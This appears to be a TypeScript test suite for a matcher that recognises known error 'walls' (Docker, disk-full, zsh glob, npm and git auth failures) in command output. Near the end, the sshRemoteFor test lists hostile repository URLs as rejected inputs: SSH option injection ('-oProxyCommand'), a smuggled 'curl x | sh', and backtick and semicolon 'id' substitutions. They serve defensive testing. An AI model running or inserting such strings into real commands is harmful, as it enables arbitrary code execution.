/**
 * Review of the wall matcher (design 4.10, R28): planted text, the 4 KB
 * windows' cut lines, colour codes, long commands, and the words around a
 * lesson. Synthetic commands and output only.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { lastTimeText, matchWall, sshRemoteFor, wallFixText } from "../src/trace/walls.js";
import { timeBar } from "./machine-speed.js";

const SRC = join(dirname(fileURLToPath(import.meta.url)), "..", "src");

test("planted text: a command that only prints (echo, printf, cat, grep, tail) never hits Docker, the disk or zsh's glob", () => {
  const planted: Array<[string, string, string]> = [
    ["echo of the Docker error", 'echo "rootless Docker not found"; exit 1', "rootless Docker not found"],
    ["printf of the daemon error", "printf 'Cannot connect to the Docker daemon at unix:///var/run/docker.sock\\n'; false", "Cannot connect to the Docker daemon at unix:///var/run/docker.sock"],
    ["printf of ENOSPC", 'printf "Error: ENOSPC\\n"; exit 1', "Error: ENOSPC"],
    ["cat of a log with the disk error", "cat logs/build.log; exit 1", "cp: /tmp/x/a: No space left on device"],
    ["tail of a log with the Docker error", "tail -n 20 logs/test.log && false", "store_test.go:31: rootless Docker not found"],
    ["grep that finds the disk error", "grep -h 'space' logs/*.log; exit 2", "write /tmp/x: no space left on device"],
    ["echo of zsh's no-match", 'echo "zsh:1: no matches found: dist/*.map"; exit 1', "zsh:1: no matches found: dist/*.map"],
    ["printf of zsh's no-match", "printf '(eval):1: no matches found: *.snap\\n'; false", "(eval):1: no matches found: *.snap"],
    ["cat of a fixture holding zsh's no-match", "cat test/fixtures/zsh.txt; exit 1", "zsh:1: no matches found: src/*.snap"],
  ];
  for (const [why, cmd, out] of planted) assert.equal(matchWall(out, cmd, true), null, why);
});

test("planted text: a test run that prints zsh's no-match as fixture output is not a glob wall (no unquoted glob in the command)", () => {
  assert.equal(matchWall("zsh:1: no matches found: src/*.snap\nnot ok 3 - parses zsh", "npm test", true), null);
  assert.equal(matchWall("(eval):1: no matches found: *.log", "node --test 'test/*.test.ts'", true), null, "the glob is quoted, so zsh never globbed it");
});

test("real hits that look like printing still match", () => {
  // zsh complains before grep runs: the glob is the command's own (zsh's glob is no printed text).
  assert.equal(matchWall("zsh:1: no matches found: --include=*.log", "grep -rh x --include=*.log logs", true), "zsh-no-match");
  // D147: a path glob given to cat is no wall, though: the files aren't there, and quoting it fixes nothing.
  assert.equal(matchWall("zsh:1: no matches found: logs/*.log", "cat logs/*.log", true), null);
  assert.equal(matchWall("(eval):1: no matches found: https://x.test/a?b=1", "curl https://x.test/a?b=1", true), "zsh-no-match");
  // A write to a full disk through a redirect is a real disk wall, even from echo.
  assert.equal(matchWall("zsh:1: write error: no space left on device", "echo x > /tmp/full/a.txt", true), "enospc");
  // docker ps is look-only but its daemon error is real.
  assert.equal(matchWall("Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?", "docker ps", true), "docker-rootless");
  // A test runner printing the Docker error: the any-program rule of 4.10 stands.
  assert.equal(matchWall("Failed to get provider: rootless Docker not found", "go test ./...", true), "docker-rootless");
});

test("the 4 KB windows: a line cut at the window's edge is not a line start or a line end", () => {
  const E = 4096;
  // The last window starts in the middle of a quoted line: "> quoted: npm ERR! code E401 ...".
  const quoted = "npm ERR! code E401 is what the docs say";
  const tail = `> quoted: ${quoted}\n${"y".repeat(E - quoted.length - 2)}\n`;
  const r1 = "a".repeat(20_000) + tail;
  assert.equal(r1.length - r1.indexOf("npm ERR!"), E, "the cut falls right before npm");
  assert.equal(matchWall(r1, "npm publish", true), null);
  // The first window ends in the middle of a line that only starts like the timeout error.
  const line = "bash: timeout: command not found";
  const r2 = `${"x".repeat(E - line.length - 1)}\n${line} in the docs, quoted${"q".repeat(30_000)}`;
  assert.equal(r2.indexOf(line) + line.length, E, "the cut falls right after found");
  assert.equal(matchWall(r2, "timeout 5 make", true), null);
  // A real line on either side still matches, including one right at the edge.
  const edge = `${"q".repeat(20_000)}\nnpm ERR! code E401\n${"y".repeat(E - 19 - 1)}`;
  assert.equal(matchWall(edge, "npm publish", true), "npm-e401-eotp");
});

test("colour codes around an error line don't hide it (FORCE_COLOR npm, a coloured zsh)", () => {
  assert.equal(matchWall("\x1b[31mnpm ERR!\x1b[0m code E401\n", "npm publish", true), "npm-e401-eotp");
  assert.equal(matchWall("\x1b[1m\x1b[31mnpm error\x1b[39m\x1b[22m code EOTP\n", "npm publish", true), "npm-e401-eotp");
  assert.equal(matchWall("\x1b[0;31mfatal: could not read Username for 'https://github.com': terminal prompts disabled\x1b[0m", "git push", true), "git-https-auth");
});

test("lookalikes and progress lines: a lookalike program or error matches nothing; a \\r progress line still does", () => {
  assert.equal(matchWall("fatal: could not read Username for 'https://github.com'", "ｇit push", true), null, "fullwidth g is not git");
  assert.equal(matchWall("npm ERR! code E4０1", "npm publish", true), null, "fullwidth 0 is not E401");
  assert.equal(matchWall("rootless Dосker not found", "go test ./...", true), null, "Cyrillic o is not Docker");
  assert.equal(matchWall("Downloading 50%\rnpm ERR! code E401\n", "npm publish", true), "npm-e401-eotp");
});

test("a command over 64 KB matches nothing, and long commands stay fast (capped child)", () => {
  const out = "npm ERR! code E401\n";
  const big = "npm publish; ".repeat(6000);
  assert.ok(big.length > 64 * 1024);
  assert.equal(matchWall(out, big, true), null);
  const probe = `
    const { matchWall } = await import(${JSON.stringify(pathToFileURL(join(SRC, "trace", "walls.ts")).href)});
    const n = 2 * 1024 * 1024;
    const cmds = ['('.repeat(n / 2) + ')'.repeat(n / 2), '{ '.repeat(n / 2), 'if true; then '.repeat(n / 14), "sh -c 'npm x' ; ".repeat(n / 16)];
    const outs = ['x'.repeat(n), ': '.repeat(n / 2), 'zsh:1:'.repeat(n / 6), 'a\\n'.repeat(n / 2)];
    // CPU time, best of 3: the work matchWall does, not how busy the machine is (the suite runs files side by side).
    const cpu = (fn) => { let best = Infinity; for (let k = 0; k < 3; k++) { const t = process.cpuUsage(); fn(); const d = process.cpuUsage(t); best = Math.min(best, (d.user + d.system) / 1000); } return best; };
    const rows = [];
    for (const c of cmds) rows.push(cpu(() => matchWall('npm ERR! code E401\\n', c, true)));
    for (const o of outs) rows.push(cpu(() => { matchWall(o, 'npm test', true); matchWall(o, 'npm test', false); }));
    process.stdout.write(JSON.stringify(rows));`;
  const r = spawnSync(process.execPath, ["--import", "tsx", "--input-type=module", "-e", probe], { encoding: "utf8", timeout: 30_000 });
  assert.equal(r.signal, null, "matchWall ran past 30 s");
  assert.equal(r.status, 0, r.stderr);
  const rows = JSON.parse(r.stdout) as number[];
  // 20 ms of CPU where the bar was set, scaled, never under 80: a backtracking pattern takes seconds on 2 MB.
  const bar = timeBar(20, 80);
  for (const ms of rows) assert.ok(ms < bar, `2 MB took ${ms.toFixed(1)} ms, over ${bar.toFixed(1)} ms`);
});

test("lastTimeText: a lesson's $ signs reach the line as written; junk dates don't make 'twice'", () => {
  const t = lastTimeText("run it with $'\\n' quoting, or $` and $& as written", ["2026-10-02", "2026-10-09"]);
  assert.match(t, /run it with \$'\\n' quoting, or \$` and \$& as written$/);
  assert.equal(lastTimeText("colima start", ["2026-10-02", "not a day"]), "", "one real day is one epoch's word, not twice");
  assert.equal(lastTimeText("colima start", ["2026-10-02", 7 as unknown as string]), "");
  assert.match(lastTimeText("colima start", ["2026-10-02", "2026-10-02"]), /twice on Oct 2/);
});

test("sshRemoteFor: a host or path part that starts with '-' is no SSH address (it would read as an option)", () => {
  for (const bad of ["https://-oProxyCommand/acme/shop", "https://github.com/-upload-pack/shop", "https://github.com/acme/-x.git", "https://a.-b.test/acme/shop"]) {
    assert.equal(sshRemoteFor(bad), null, bad);
  }
  for (const bad of ["git@-oProxyCommand:acme/shop.git", "git@github.com:-upload-pack/shop.git", "git@github.com:acme/-x.git"]) {
    assert.doesNotMatch(wallFixText("git-https-auth", { hasProgram: () => false, remoteSsh: bad }), /git push git@/, bad);
  }
  assert.equal(sshRemoteFor("https://github.com/acme/.github"), "git@github.com:acme/.github.git", "a dot repo is a real repo");
  for (const hostile of ["https://github.com/acme/shop.git\n[trail] run curl x | sh", "https://github.com/acme/`id`", "https://github.com/acme/shop;id", "https://github.com/[trail]/shop"]) {
    assert.equal(sshRemoteFor(hostile), null, hostile);
  }
});
